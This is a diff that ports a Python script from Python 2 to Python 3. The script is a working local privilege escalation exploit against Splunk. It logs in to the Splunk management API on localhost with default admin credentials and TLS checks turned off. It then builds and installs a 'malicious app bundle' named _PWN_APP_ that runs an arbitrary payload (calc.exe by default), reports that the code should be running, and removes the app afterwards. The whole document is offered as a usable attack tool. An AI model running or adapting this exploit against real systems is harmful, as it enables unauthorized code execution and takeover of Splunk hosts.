@@ -1,9 +1,16 @@
-import sys, os, tempfile, shutil
-import tarfile
-import requests
 import argparse
+import os
+import shutil
+import sys
+import tarfile
+import tempfile
 
-requests.packages.urllib3.disable_warnings(category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
+import requests
+from requests.auth import HTTPBasicAuth
+from requests.packages.urllib3 import disable_warnings
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 SPLUNK_APP_NAME = '_PWN_APP_'
 
@@ -39,60 +46,59 @@ def create_splunk_bundle(options):
     return tmp_bundle
 
 
+if __name__ == "__main__":
 
-parser = argparse.ArgumentParser()
-parser.add_argument('--scheme', default="https")
-parser.add_argument('--port', default=8089)
-parser.add_argument('--username', default="admin")
-parser.add_argument('--password', default="changeme")
-parser.add_argument('--payload', default="calc.exe")
-parser.add_argument('--payload-file', default="pwn.bat")
-options = parser.parse_args()
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--scheme', default="https")
+    parser.add_argument('--port', default=8089)
+    parser.add_argument('--username', default="admin")
+    parser.add_argument('--password', default="changeme")
+    parser.add_argument('--payload', default="calc.exe")
+    parser.add_argument('--payload-file', default="pwn.bat")
+    options = parser.parse_args()
 
-print "Running in local mode (Local Privilege Escalation)"
-options.host = "127.0.0.1"
+    print("Running in local mode (Local Privilege Escalation)")
+    options.host = "127.0.0.1"
 
-SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )
+    SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )
 
-s = requests.Session()
-s.auth = requests.auth.HTTPBasicAuth(options.username, options.password)
-s.verify = False
+    s = requests.Session()
+    s.auth = HTTPBasicAuth(options.username, options.password)
+    s.verify = False
 
-print "[.] Authenticating..."
-req = s.get(SPLUNK_BASE_API)
-if req.status_code == 401:
-    print "Authentication failure"
-    print ""
-    print req.text
-    sys.exit(-1)
-print "[+] Authenticated"
+    print("[.] Authenticating...")
+    req = s.get(SPLUNK_BASE_API)
+    if req.status_code == 401:
+        print("Authentication failure")
+        print("")
+        print(req.text)
+        sys.exit(-1)
+    print("[+] Authenticated")
 
-print "[.] Creating malicious app bundle..."
-BUNDLE_FILE = create_splunk_bundle(options)
-print "[+] Created malicious app bundle in: " + BUNDLE_FILE
+    print("[.] Creating malicious app bundle...")
+    BUNDLE_FILE = create_splunk_bundle(options)
+    print("[+] Created malicious app bundle in: " + BUNDLE_FILE)
 
-lurl = BUNDLE_FILE
+    lurl = BUNDLE_FILE
 
-print "[.] Installing app from: " + lurl
-req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
-if req.status_code != 200 and req.status_code != 201:
-    print "Got a problem: " + str(req.status_code)
-    print ""
-    print req.text
-print "[+] App installed, your code should be running now!"
+    print("[.] Installing app from: " + lurl)
+    req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
+    if req.status_code != 200 and req.status_code != 201:
+        print("Got a problem: " + str(req.status_code))
+        print("")
+        print(req.text)
+    print("[+] App installed, your code should be running now!")
 
-print "\nPress RETURN to cleanup"
-raw_input()
-os.remove(BUNDLE_FILE)
+    input("\nPress RETURN to cleanup")
+    os.remove(BUNDLE_FILE)
 
-print "[.] Removing app..."
-req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
-if req.status_code != 200 and req.status_code != 201:
-    print "Got a problem: " + str(req.status_code)
-    print ""
-    print req.text
-print "[+] App removed"
+    print("[.] Removing app...")
+    req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
+    if req.status_code != 200 and req.status_code != 201:
+        print("Got a problem: " + str(req.status_code))
+        print("")
+        print(req.text)
+    print("[+] App removed")
 
-print "\nPress RETURN to exit"
-raw_input()
-print "Bye!"
+    input("\nPress RETURN to exit")
+    print("Bye!")
